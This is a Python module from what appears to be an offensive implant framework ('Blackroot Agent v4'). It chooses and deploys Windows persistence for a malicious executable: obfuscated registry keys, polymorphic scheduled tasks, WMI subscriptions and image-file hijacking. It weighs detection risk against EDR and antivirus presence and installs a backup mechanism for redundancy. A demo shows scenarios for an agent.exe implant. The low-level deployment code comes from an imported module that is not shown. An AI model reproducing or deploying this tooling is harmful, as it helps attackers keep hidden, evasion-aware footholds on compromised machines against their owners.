"""
INTELLIGENT PERSISTENCE MANAGER: Unified Decision-Making for Persistence
=========================================================================

Uses UnifiedCausalReasonerV2 to intelligently select persistence mechanisms based on:
- Current risk level and threat exposure
- Environment detection (EDR, AV, network segmentation)
- Available resources and privilege level
- Operational phase and strategy

Persistence Options:
- registry_randomized: Fast, common, moderate detection risk
- registry_obfuscated: Obfuscated paths, lower detection
- polymorphic_task: Scheduled tasks with polymorphic names
- wmi_subscription: WMI event-driven, stealthy
- image_hijacking: System binary redirection, hidden
- silent_mode: No persistence, maintain presence only

Author: Blackroot Agent v4
Date: April 6, 2026
"""

import logging
from typing import Dict, List, Optional, Any
from dataclasses import dataclass

from world_state import OperationalPhase
from unified_integration import create_integration
from persistence_hardening import PersistenceManager

logger = logging.getLogger("IntelligentPersistenceManager")


@dataclass
class PersistenceStrategy:
    """Strategy for persistence based on intelligence"""
    primary_mechanism: str  # Best choice given conditions
    alternatives: List[str]  # Backup options
    confidence: float  # How confident we are in this recommendation
    reasoning: str  # Human-readable explanation
    estimated_detection_risk: float  # Predicted detection probability
    estimated_persistence_duration: float  # How long this should last


class IntelligentPersistenceManager:
    """
    Intelligent wrapper around persistence mechanisms
    
    Chooses the best persistence approach based on:
    1. Current risk exposure
    2. Environment detection (EDR, AV)
    3. Available resources (privilege level)
    4. Operational strategy
    5. Learning from past successes
    
    Usage:
        manager = IntelligentPersistenceManager()
        strategy = manager.choose_persistence_strategy(
            executable_path="/path/to/agent",
            threat_level=0.6,
            edr_detected=True
        )
        
        if strategy.confidence > 0.7:
            success = manager.deploy_persistence(
                executable=executable_path,
                strategy=strategy
            )
    """
    
    def __init__(self):
        self.integration = create_integration("intelligent_persistence")
        
        # Persistence mechanism options
        self.mechanisms = {
            "registry_randomized": {
                "speed": 0.9,
                "reliability": 0.8,
                "detection_risk": 0.75,
                "requires_admin": False,
                "requires_evasion": True,
            },
            "registry_obfuscated": {
                "speed": 0.9,
                "reliability": 0.8,
                "detection_risk": 0.50,
                "requires_admin": False,
                "requires_evasion": True,
            },
            "polymorphic_task": {
                "speed": 0.7,
                "reliability": 0.85,
                "detection_risk": 0.55,
                "requires_admin": False,
                "requires_evasion": False,
            },
            "wmi_subscription": {
                "speed": 0.6,
                "reliability": 0.75,
                "detection_risk": 0.35,
                "requires_admin": True,
                "requires_evasion": False,
            },
            "image_hijacking": {
                "speed": 0.5,
                "reliability": 0.90,
                "detection_risk": 0.45,
                "requires_admin": True,
                "requires_evasion": False,
            },
            "silent_mode": {
                "speed": 1.0,
                "reliability": 0.95,
                "detection_risk": 0.1,
                "requires_admin": False,
                "requires_evasion": False,
            },
        }
        
        logger.info("[IntelligentPersistenceManager] Initialized")
    
    def choose_persistence_strategy(
        self,
        executable_path: str,
        threat_level: float,
        edr_detected: bool = False,
        av_present: bool = False,
        privilege_level: str = "user",
        time_available: float = 60.0,  # Minutes
    ) -> PersistenceStrategy:
        """
        Choose best persistence mechanism for current conditions
        
        Args:
            executable_path: Path to agent executable
            threat_level: 0-1, current threat/risk exposure
            edr_detected: Has EDR been detected?
            av_present: Is antivirus present?
            privilege_level: "user", "admin", or "system"
            time_available: Minutes available for persistence setup
        
        Returns:
            PersistenceStrategy with recommendation
        """
        
        # Build context for decision
        context = {
            "threat_level": threat_level,
            "edr_detected": edr_detected,
            "av_present": av_present,
            "privilege_level": privilege_level,
            "time_available": min(time_available / 60.0, 1.0),  # Normalize to 0-1
        }
        
        # Filter available options based on privilege
        available_options = list(self.mechanisms.keys())
        if privilege_level == "user":
            available_options = [
                m for m in available_options 
                if not self.mechanisms[m]["requires_admin"]
            ]
        
        # Get unified decision
        decision = self.integration.decide(
            phase=OperationalPhase.PERSISTENCE,
            options=available_options,
            context=context
        )
        
        # Extract mechanism choice
        primary_mechanism = decision.recommended_option
        alternatives = decision.alternatives
        
        # Calculate estimated risks
        mechanism_profile = self.mechanisms[primary_mechanism]
        
        # Adjust detection risk based on environment
        detection_risk = mechanism_profile["detection_risk"]
        if edr_detected:
            detection_risk = min(1.0, detection_risk * 1.3)  # 30% worse with EDR
        if av_present:
            detection_risk = min(1.0, detection_risk * 1.2)  # 20% worse with AV
        
        # Estimate duration (mechanisms with lower detection risk last longer)
        persistence_duration = 0.5 + (1.0 - detection_risk) * 0.5  # 50%-100%
        
        # Build strategy
        strategy = PersistenceStrategy(
            primary_mechanism=primary_mechanism,
            alternatives=alternatives,
            confidence=decision.confidence,
            reasoning=f"Selected {primary_mechanism} based on threat_level={threat_level:.0%}, "
                     f"edr_detected={edr_detected}, privilege={privilege_level}, "
                     f"confidence={decision.confidence:.0%}",
            estimated_detection_risk=detection_risk,
            estimated_persistence_duration=persistence_duration,
        )
        
        logger.info(
            f"[IntelligentPersistenceManager] Chose {primary_mechanism} "
            f"(confidence={strategy.confidence:.0%}, "
            f"detection_risk={detection_risk:.0%})"
        )
        
        return strategy
    
    def deploy_persistence(
        self,
        executable: str,
        strategy: PersistenceStrategy,
        seed: Optional[str] = None,
    ) -> bool:
        """
        Deploy persistence according to chosen strategy
        
        Args:
            executable: Path to executable
            strategy: PersistenceStrategy from choose_persistence_strategy()
            seed: Optional seed for reproducible randomization
        
        Returns:
            True if primary mechanism succeeded
        """
        
        logger.info(
            f"[IntelligentPersistenceManager] Deploying {strategy.primary_mechanism} "
            f"persistence for {executable}"
        )
        
        # Deploy primary mechanism
        try:
            results = self._deploy_mechanism(
                mechanism=strategy.primary_mechanism,
                executable=executable,
                seed=seed
            )
            
            success = results.get(strategy.primary_mechanism, False)
            
            # Record outcome with unified reasoner
            self.integration.record_outcome(
                decision=self.integration.last_decision,
                success=success,
                error=None if success else "Deployment failed",
                metadata={
                    "mechanism": strategy.primary_mechanism,
                    "executable": executable,
                    "estimated_duration": strategy.estimated_persistence_duration,
                }
            )
            
            if success:
                logger.info(
                    f"[IntelligentPersistenceManager] ✓ {strategy.primary_mechanism} deployed successfully"
                )
                
                # Try to deploy alternatives for redundancy (if high confidence)
                if strategy.confidence > 0.8 and len(strategy.alternatives) > 0:
                    logger.info(
                        f"[IntelligentPersistenceManager] Confidence high, deploying backup: {strategy.alternatives[0]}"
                    )
                    self._deploy_mechanism(
                        mechanism=strategy.alternatives[0],
                        executable=executable,
                        seed=seed
                    )
            else:
                logger.error(
                    f"[IntelligentPersistenceManager] ✗ {strategy.primary_mechanism} deployment failed"
                )
            
            return success
        
        except Exception as e:
            logger.error(f"[IntelligentPersistenceManager] Exception during deployment: {e}")
            self.integration.record_outcome(
                decision=self.integration.last_decision,
                success=False,
                error=str(e)
            )
            return False
    
    def _deploy_mechanism(
        self,
        mechanism: str,
        executable: str,
        seed: Optional[str] = None,
    ) -> Dict[str, bool]:
        """Deploy a specific persistence mechanism"""
        
        if mechanism == "silent_mode":
            # No persistence, just maintain connection
            logger.info("[IntelligentPersistenceManager] Using silent mode (no persistence)")
            return {"silent_mode": True}
        
        # Use PersistenceManager to deploy
        if mechanism == "registry_randomized":
            result = PersistenceManager.deploy_all_persistence_methods(executable, seed)
            return {"registry_randomized": result.get("registry_randomized", False)}
        
        elif mechanism == "registry_obfuscated":
            result = PersistenceManager.deploy_all_persistence_methods(executable, seed)
            return {"registry_obfuscated": result.get("registry_obfuscated", False)}
        
        elif mechanism == "polymorphic_task":
            result = PersistenceManager.deploy_all_persistence_methods(executable, seed)
            return {"polymorphic_task": result.get("polymorphic_task", False)}
        
        elif mechanism == "wmi_subscription":
            result = PersistenceManager.deploy_all_persistence_methods(executable, seed)
            return {"wmi_subscription": result.get("wmi_subscription", False)}
        
        elif mechanism == "image_hijacking":
            result = PersistenceManager.deploy_all_persistence_methods(executable, seed)
            return {"image_hijacking": result.get("image_hijacking", False)}
        
        else:
            logger.warning(f"[IntelligentPersistenceManager] Unknown mechanism: {mechanism}")
            return {mechanism: False}
    
    def get_decision_history(self) -> List[Dict[str, Any]]:
        """Get history of persistence decisions for transparency"""
        return self.integration.get_decision_history(limit=10)


# =============================================================================
# DEMO: Intelligent Persistence Selection
# =============================================================================

if __name__ == "__main__":
    import sys
    
    logging.basicConfig(
        level=logging.INFO,
        format="%(name)s - %(levelname)s - %(message)s"
    )
    
    manager = IntelligentPersistenceManager()
    
    print("=" * 70)
    print("INTELLIGENT PERSISTENCE STRATEGY SELECTION")
    print("=" * 70)
    
    # Scenario 1: Safe environment, user privileges
    print("\n[Scenario 1] Safe environment, user privileges")
    print("-" * 70)
    strategy = manager.choose_persistence_strategy(
        executable_path="C:\\temp\\agent.exe",
        threat_level=0.1,
        edr_detected=False,
        av_present=False,
        privilege_level="user",
        time_available=300
    )
    print(f"Recommendation: {strategy.primary_mechanism}")
    print(f"Confidence: {strategy.confidence:.0%}")
    print(f"Detection risk: {strategy.estimated_detection_risk:.0%}")
    print(f"Reasoning: {strategy.reasoning}")
    
    # Scenario 2: Moderate threat, EDR detected
    print("\n[Scenario 2] Moderate threat, EDR detected")
    print("-" * 70)
    strategy = manager.choose_persistence_strategy(
        executable_path="C:\\temp\\agent.exe",
        threat_level=0.4,
        edr_detected=True,
        av_present=False,
        privilege_level="user",
        time_available=120
    )
    print(f"Recommendation: {strategy.primary_mechanism}")
    print(f"Confidence: {strategy.confidence:.0%}")
    print(f"Detection risk: {strategy.estimated_detection_risk:.0%}")
    print(f"Reasoning: {strategy.reasoning}")
    
    # Scenario 3: High threat, admin privileges, limited time
    print("\n[Scenario 3] High threat, admin privileges, limited time")
    print("-" * 70)
    strategy = manager.choose_persistence_strategy(
        executable_path="C:\\temp\\agent.exe",
        threat_level=0.7,
        edr_detected=True,
        av_present=True,
        privilege_level="admin",
        time_available=60
    )
    print(f"Recommendation: {strategy.primary_mechanism}")
    print(f"Confidence: {strategy.confidence:.0%}")
    print(f"Detection risk: {strategy.estimated_detection_risk:.0%}")
    print(f"Reasoning: {strategy.reasoning}")
    print(f"Backup options: {strategy.alternatives}")
